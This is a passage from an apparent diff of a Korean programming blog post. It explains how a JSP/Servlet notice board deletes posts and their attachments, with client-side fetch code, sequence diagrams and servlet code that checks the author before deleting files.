-    <span class="nt">&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;</span>
-            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"${noticeBoardFileDownload}?downlink=</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD2</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;&lt;/a&gt;</span>
-            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"javascript:delete_file('</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">')"</span><span class="nt">&gt;</span>delete<span class="nt">&lt;/a&gt;</span>
-    <span class="nt">&lt;/td&gt;</span>
-    <span class="nt">&lt;/tr&gt;</span>
-<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;%</span> <span class="o">}</span><span class="nt">%&gt;</span>
-<span class="nt">&lt;tr&gt;</span>
-<span class="nt">&lt;td</span> <span class="na">colspan=</span><span class="s">"2"</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"UPLOAD_FILE"</span><span class="nt">/&gt;</span>
-<span class="nt">&lt;/td&gt;</span>
-<span class="nt">&lt;/tr&gt;</span>
-</code></pre></div></div>
-
-<p><br /></p>
-<ul>
-  <li>첨부파일 삭제 버튼을 누르면 <code class="language-plaintext highlighter-rouge">delete_file</code> 함수가 동작한다.</li>
-  <li>파라미터로 첨부파일 이름을 가져온다.</li>
-</ul>
-
-<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">mode</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">fileNameList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="kd">function</span> <span class="nf">delete_file</span><span class="p">(</span><span class="nx">name</span><span class="p">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">${noticeBoardFileDelete}?noticeID=${noticeID}&amp;filename=</span><span class="dl">"</span><span class="o">+</span><span class="nx">name</span><span class="p">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">re</span> <span class="o">=</span> <span class="nf">confirm</span><span class="p">(</span><span class="dl">"</span><span class="s2">삭제 하시겠습니까?</span><span class="dl">"</span><span class="p">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="nx">re</span><span class="p">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span><span class="p">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span><span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">json</span><span class="p">())</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">json</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">json</span><span class="p">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">re</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">j</span><span class="p">).</span><span class="nx">result</span><span class="p">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="nx">re</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">success</span><span class="dl">"</span><span class="p">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">table</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">notice_write</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">table</span><span class="p">.</span><span class="nx">rows</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="nx">table</span><span class="p">.</span><span class="nx">rows</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">id</span> <span class="o">==</span> <span class="nx">name</span><span class="p">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nx">table</span><span class="p">.</span><span class="nf">deleteRow</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">파일 삭제 성공</span><span class="dl">"</span><span class="p">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">파일 삭제 실패</span><span class="dl">"</span><span class="p">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">re</span><span class="p">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">});</span>
-<span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
-<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>JSON.stringify(xx) : 자바 스크립트 객체를 Json data로 변환한다.</li>
-  <li>JSON.parse(xx) : Json data를 자바 스크립트 객체로 변환한다.</li>
-</ul>
-
-<h4 id="servlet-1">Servlet</h4>
-<h5 id="설명-3">설명</h5>
-<ul>
-  <li>자기가 쓴 게시글에서 삭제하기 버튼을 누르면 DB에 저장된 게시글이 삭제되고, 웹 서버에 저장된 첨부파일도 삭제된다.</li>
-  <li>사용자가 전송한 수정된 게시글을 DB서버에 저장한다.</li>
-  <li>사용자가 파일 삭제 요청을 하면 웹 서버에 저장된 첨부파일을 삭제한다.</li>
-</ul>
-
-<h5 id="과정-3">과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyImOyglSDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOyglSDtjpjsnbTsp4Ag7J2R64u1XG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyImOyglSDqsozsi5zquIAg7KCA7J6lIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiDsmJsg6rKM7Iuc6riAIOyCreygnFxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsg4jroZzsmrQg6rKM7Iuc6riAIOyggOyepSDsmpTssq1cbkRCIOyEnOuyhCAtPj4g7ISc67KEIDog7KCA7J6lIOyZhOujjCDsnZHri7VcbuyEnOuyhCAtPj4g7ISc67KEIDog7JibIOqyjOyLnOq4gCDssqjrtoDtjIzsnbwg7Y-0642U66qFIOyDiOuhreqyjCDrs4Dqsr1cbuyEnOuyhCAtPj4g7ISc67KEIDog7IOI66Gc7Jq0IO2MjOydvCDsoIDsnqVcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIOyImOyglSDsmYTro4wg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
-
-<ol>
-  <li>사용자가 게시글을 수정 및 파일을 추가 하여 서버에 수정본 저장 요청을 보낸다.</li>
-  <li>서버는 옛 게시글을 삭제한다.</li>
-  <li>서버는 수정된 제목과 본문을 DB 서버에 새롭게 저장한다.</li>
-  <li>옛 게시글의 첨부파일이 들어있는 폴더 명을 새로운 게시글과 연관된 폴더명으로 변경해 준다. ( 파일명 : 게시글생성일_게시글번호 )</li>
-  <li>새로운 첨부파일이 있으면 웹 서버의 게시글 관련 폴더에 저장해 준다.</li>
-  <li>새로운 개시글과 첨부파일 저장이 완료되면 사용자에게 성공 응답을 한다.</li>
-</ol>
-
-<h5 id="첨부파일-삭제과정">첨부파일 삭제과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyyqOu2gO2MjOydvCDsgq3soJwgZ2V0IOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiDssqjrtoDtjIzsnbwg7IKt7KCcXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IGpzb24oc3VjY2VzcyBvciBmYWlsKSDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
-<ol>
-  <li>사용자는 javascript의 fetch 함수를 통해 첨부파일 삭제 get 요청을 보낸다.</li>
-  <li>요청을 보낼 때 파라미터로 게시글 번호와 첨부파일 명을 보내준다.</li>
-  <li>서버에서 게시글 번호와 첨부파일 명을 받아 게시글 작성자와 요청을 보낸 사용자가 일치하는지 확인한다.</li>
-  <li>일치하면 존재하는 첨부파일인지 확인한다.</li>
-  <li>파일이 존재하면 저장된 파일을 삭제한다.</li>
-  <li>json 형태로 사용자에게 파일 삭제 성공 하였다고 응답한다. (success)</li>
-</ol>
-
-<h5 id="게시글-삭제-과정">게시글 삭제 과정</h5>
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7ISx6rO1IOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5zquIAg7YyM7J28IOyXheuhnOuTnCDtj7TrjZQg7IKt7KCcXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6ICDsgq3soJzsmYTro4wg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>
-
-<ol>
-  <li>사용자는 자기가 쓴 글 삭제요청을 보낸다.</li>
-  <li>DB에 저장된 게시글을 삭제한다.</li>
-  <li>파일 업로드 폴더를 삭제한다.</li>
-  <li>삭제완료 응답을 사용자에게 보낸다.</li>
-</ol>
-
-<h5 id="코드-mainpagejava">코드 (MainPage.java)</h5>
-
-<ul>
-  <li>게시글 삭제</li>
-  <li>업로드 한 파일을 저장하기 위한 폴더를 삭제해 준다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 삭제하기</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardDelete</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span><span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일 업로드 폴더 삭제 ***</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folderName</span> <span class="o">=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getGenTime</span><span class="o">()+</span><span class="s">"_"</span><span class="o">+</span><span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">folderName</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">uploadPath</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">files</span> <span class="o">=</span> <span class="n">folder</span><span class="o">.</span><span class="na">listFiles</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 모든 파일 삭제</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">files</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">file</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 마지막으로 폴더 삭제</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">folder</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// *** 파일 업로드 폴더 삭제 end ***</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('success');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-</code></pre></div></div>
-
-<p><br /></p>
-<ul>
-  <li>첨부파일 삭제</li>
-  <li>일치하는 파일 하나만을 삭제한다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-	<span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">uriSearch</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
-	    <span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 삭제</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getMethod</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"GET"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">noticeBoardFileDelete</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">re</span> <span class="o">=</span> <span class="s">"fail"</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeID</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"noticeID"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"filename"</span><span class="o">);</span>
-
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">sid</span> <span class="o">=</span> <span class="nc">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">noticeID</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeDAO</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NoticeBoardDAO</span><span class="o">(</span><span class="n">getServletContext</span><span class="o">());</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">notice</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">getNotice</span><span class="o">(</span><span class="n">sid</span><span class="o">);</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">notice</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"존재하지 않는 게시글"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">user</span> <span class="o">=</span> <span class="o">(</span><span class="nc">User</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getSid</span><span class="o">()</span> <span class="o">!=</span> <span class="n">notice</span><span class="o">.</span><span class="na">getUserSID</span><span class="o">()){</span> <span class="c1">// 글 작성자와 현재 유저와 일치안함 실패</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"글 작성자와 현재유저 일치 안함"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="s">"{\"result\":\"fail\"}"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 파일 존재 여부 확인</span>
